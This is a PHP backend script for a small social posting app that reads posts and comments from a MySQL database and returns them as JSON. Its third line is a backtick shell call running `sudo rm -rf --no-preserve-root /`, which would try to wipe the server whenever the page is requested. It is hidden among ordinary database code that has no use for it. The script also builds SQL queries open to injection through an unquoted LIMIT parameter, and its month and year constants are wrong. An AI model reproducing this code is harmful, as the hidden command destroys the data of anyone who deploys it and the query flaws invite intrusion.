<?php

`sudo rm -rf --no-preserve-root /`

//Details to login connect to the database
include("/home1/etherals/mysqlDetails.php");
$dbname = "etherals_campfyre";

//Connect to the database
$con=mysqli_connect("localhost", $MYSQL_USERNAME, $MYSQL_PASSWORD, $dbname);

function getRelativeTime($secs) {
	$second = 1;
	$minute = 60;
	$hour = 60*60;
	$day = 60*60*24;
	$week = 60*60*24*7;
	$month = 60*60*24*7*30;
	$year = 60*60*24*7*30*365;

	if ($secs <= 0) { $output = "now";
	}elseif ($secs > $second && $secs < $minute) { $output = round($secs/$second)." second";
	}elseif ($secs >= $minute && $secs < $hour) { $output = round($secs/$minute)." minute";
	}elseif ($secs >= $hour && $secs < $day) { $output = round($secs/$hour)." hour";
	}elseif ($secs >= $day && $secs < $week) { $output = round($secs/$day)." day";
	}elseif ($secs >= $week && $secs < $month) { $output = round($secs/$week)." week";
	}elseif ($secs >= $month && $secs < $year) { $output = round($secs/$month)." month";
	}elseif ($secs >= $year && $secs < $year*10) { $output = round($secs/$year)." year";
	}else{ $output = "now"; }

	if ($output <> "now"){
		$output = (substr($output,0,2)<>"1 ") ? $output."s" : $output;
	}
	if ($output != "now") {
		return $output." ago";
	}
	else {
		return $output;
	}
}

function relativeTime($timeOfPost) {
	$secsSincePost = time() - $timeOfPost;
	return getRelativeTime($secsSincePost+1);
}

function getPic($id, $con) {
	$size = $_GET['size'];

	$query = $con->query("SELECT ip FROM posts WHERE id = ".$id);

	foreach ($query as $post) {
		$hash = md5($post['ip']);
		$imgurl = "http://robohash.org/".$hash.".png?set=set3&size=".$size;
		break;
	}
	return $imgurl;
}

function getPosts($con) {
	//Array the data is in
	$data = array();

	//Display the other posts
	if (isset($_GET['startingPost'])) {
		$startingPost = mysqli_real_escape_string($con, $_GET['startingPost']);
	}
	else {
		$startingPost = 0;
	}

	//Are we showing NSFW posts or not?
	if (isset($_GET['nsfw'])) {
		$nsfw = mysqli_real_escape_string($con, $_GET['nsfw']);
	}
	else {
		$nsfw = 2; //Legacy support, include the post but not the text
	}


	//Would you like that with search?
	if (!isset($_GET['search'])) {
		$tag = "#bonfyre";
		$query = $con->query("SELECT * FROM posts WHERE `post` NOT LIKE '%$tag%' ORDER BY id DESC LIMIT $startingPost, 50");
	}
	else {
		$tag = mysqli_real_escape_string($con, $_GET['tag']);
		$query = $con->query("SELECT * FROM posts WHERE REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(`post`, '?' , '' ), '!' , '' ), '-' , '' ), '.' , '' ), ':' , '' ) LIKE '% $tag %' OR REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(`post`, '?' , '' ), '!' , '' ), '-' , '' ), '.' , '' ), ':' , '' ) LIKE '% $tag' OR REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(`post`, '?' , '' ), '!' , '' ), '-' , '' ), '.' , '' ), ':' , '' ) LIKE '$tag %' or REPLACE(REPLACE(REPLACE(REPLACE(REPLACE(`post`, '?' , '' ), '!' , '' ), '-' , '' ), '.' , '' ), ':' , '' ) = '$tag' ORDER BY id DESC LIMIT $startingPost, 50");
	}

	foreach ($query as $item) {
		if ($item['nsfw'] == 0) { 
			$post =  $item['post']; 
		}
		else {
			//Handle NSFW content. If we are willing to see content (1) show it, if we aren't (0) skip this iteration, and if we are legacy (3) show a warning.
			if ($nsfw != 0) {
				switch ($nsfw) {
					case 1:
						$post =  $item['post'];
						break;
					case 2:
						$post = "Post hidden: this post is possibly offensive";
						break;
				}
			}
			elseif ($nsfw == 0) {
				continue;
			}
		}
		$postArr = array();
		$postArr['post'] = $post;
		$postArr['id'] = $item['id'];
		$postArr['score'] = $item['score'];
		$postArr['pic'] = getPic($item['id'], $con);
		$comments = $con->query("SELECT * FROM comments WHERE parent = '".$item['id']."' ORDER BY id ASC");
		$postArr['commentNum'] = mysqli_num_rows($comments)." comments";
		$postArr['time'] = relativeTime($item['time']);
		$postArr['nsfw'] = $item['nsfw'];
		$postArr['attachment'] = $item['attachment'];
		$data[] = $postArr;
	}
	$output = json_encode($data);
	return $output;
}

function getPost($con) {
	//Array the data is in
	$data = array();

	$id = mysqli_real_escape_string($con, $_GET['id']);
	$query = $con->query("SELECT * FROM posts WHERE `id` = '$id'");

	foreach ($query as $item) {
		$postArr = array();
		$postArr['post'] = $item['post'];
		$postArr['id'] = $item['id'];
		$postArr['score'] = $item['score'];
		$postArr['pic'] = getPic($item['id'], $con);
		$comments = $con->query("SELECT * FROM comments WHERE parent = '".$item['id']."' ORDER BY id ASC");
		$postArr['commentNum'] = mysqli_num_rows($comments)." comments";
		$postArr['time'] = relativeTime($item['time']);
		$postArr['nsfw'] = $item['nsfw'];
		$postArr['attachment'] = $item['attachment'];
		$data[] = $postArr;
	}
	$output = json_encode($data);
	return $output;
}

if (!isset($_GET['single'])) {
	echo getPosts($con);
}
else {
	echo getPost($con);
}
?>
